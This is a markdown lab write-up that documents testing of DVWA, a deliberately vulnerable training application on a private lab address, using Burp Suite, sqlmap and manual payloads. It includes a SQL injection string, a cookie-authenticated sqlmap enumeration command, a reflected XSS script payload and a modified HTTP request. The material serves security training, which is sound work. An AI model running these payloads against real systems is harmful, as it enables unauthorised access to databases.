---

# Web Application Practical

---

## Step 1: Web Application Testing Lab

---

## Test Setup

Target application:

```text
http://192.168.198.130/dvwa
```

<p align="center">
  <img src="./Screenshots/Web_Testing/dvwa_dashboard.png" width="800"/><br/>
  <b>DVWA Dashboard showing authenticated session</b>
</p>

Tools Used:

* Burp Suite
* sqlmap
* OWASP ZAP

---

## Test Log

| Test ID | Vulnerability | Severity | Target URL                                                                                               |
| ------- | ------------- | -------- | -------------------------------------------------------------------------------------------------------- |
| 001     | SQL Injection | Critical | [http://192.168.198.130/dvwa/vulnerabilities/sqli/](http://192.168.198.130/dvwa/vulnerabilities/sqli/)   |
| 002     | XSS Reflected | Medium   | [http://192.168.198.130/dvwa/vulnerabilities/xss_r/](http://192.168.198.130/dvwa/vulnerabilities/xss_r/) |

---

## Step 2: SQL Injection Testing

---

### Phase 1: Identify Input Point

* Navigated to: **SQL Injection module**
  `http://192.168.198.130/dvwa/vulnerabilities/sqli/`
* Parameter tested: `id`

<p align="center">
  <img src="./Screenshots/Web_Testing/sqli_input_point.png" width="800"/><br/>
  <b>SQL Injection input field identified in DVWA</b>
</p>

---

### Phase 2: Manual Testing

```sql
' OR '1'='1
```

---

### Explanation

* Input not sanitized
* Query logic bypassed
* Returns all records

---

<p align="center">
  <img src="./Screenshots/Web_Testing/sqli_injection.png" width="800"/><br/>
  <b>SQL Injection returning multiple database records</b>
</p>

---

### Phase 3: Automated Testing (sqlmap)

First get the session id from the browser:

```bash
Inspect > Storage > Cookies > PHPSESSID
```

<p align="center">
  <img src="./Screenshots/Web_Testing/sqli_session_id.png" width="800"/><br/>
  <b>Session ID extracted from browser storage</b>
</p>

---

Command used:

```bash
sqlmap -u "http://192.168.198.130/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=d4f2c2bb11cd0de422cbe182f213b0a6; security=low" --dbs
```

<p align="center">
  <img src="./Screenshots/Web_Testing/sqlmap_injection.png" width="800"/><br/>
  <b>sqlmap successfully enumerating database information</b>
</p>

---

### Result

* Database successfully enumerated
* Confirms SQL Injection vulnerability

---

## Step 3: XSS Testing

---

### Phase 1: Identify Input Point

* Module: **XSS Reflected**
  `http://192.168.198.130/dvwa/vulnerabilities/xss_r/`

<p align="center">
  <img src="./Screenshots/Web_Testing/xss_payload.png" width="700"/><br/>
  <b>XSS payload injected into input field</b>
</p>

---

### Phase 2: Payload Execution

```html
<script>alert('XSS')</script>
```

<p align="center">
  <img src="./Screenshots/Web_Testing/xss_alert.png" width="500"/><br/>
  <b>Reflected XSS payload executed in browser</b>
</p>

---

### Explanation

* Input reflected without encoding
* JavaScript executed in browser

---

## Step 4: Manual Testing (Burp Suite)

---

### Phase 1: Intercept Request

* Intercept enabled in Burp Suite
* Captured HTTP request

<p align="center">
  <img src="./Screenshots/Web_Testing/burp_intercept.png" width="800"/><br/>
  <b>Burp Suite intercepting HTTP request</b>
</p>

---

### Phase 2: Modify Request

**Original Request**

<p align="center">
  <img src="./Screenshots/Web_Testing/burp_sqli_request.png" width="800"/><br/>
  <b>Original SQL request captured in Burp</b>
</p>

---

### Request Modification

```http
GET /dvwa/vulnerabilities/sqli/?id='+OR+'1'%3D'1 HTTP/1.1 ---- URL Encoded
Host: 192.168.198.130
Cookie: PHPSESSID=32d4eae368b201a9cbe21c3576fe4dad; security=low
```

<p align="center">
  <img src="./Screenshots/Web_Testing/burp_sqli_modified.png" width="800"/><br/>
  <b>Modified request with SQL injection payload</b>
</p>

Send the modified request to the server

---

### Result

* Server accepted manipulated request
* Vulnerability confirmed

<p align="center">
  <img src="./Screenshots/Web_Testing/modified_sqli_accepted.png" width="800"/><br/>
  <b>Server response confirming SQL Injection success</b>
</p>

---

## Step 5: Authentication Testing

---

### Observations

* Session-based authentication
* No session regeneration
* Weak session protection

---

### Issues Identified

* Session reuse possible
* No HttpOnly flag
* No Secure flag

---

## Step 6: Checklist

---

* SQL Injection tested (manual + sqlmap)
* XSS tested (manual payloads)
* Burp Suite interception performed
* Authentication mechanism reviewed
* Self-curated scripts (optional)

---

## Step 7: Summary

```text
The web application was tested for common OWASP Top 10 vulnerabilities. SQL Injection and XSS vulnerabilities were successfully identified and exploited. Manual testing using Burp Suite confirmed insecure input handling and weak session management. Automated testing with sqlmap validated database exposure, demonstrating significant security risks within the application.
```

---

## Outcome

* SQL Injection vulnerability confirmed
* XSS vulnerability confirmed
* Weak authentication identified
* Multiple OWASP Top 10 issues present

---

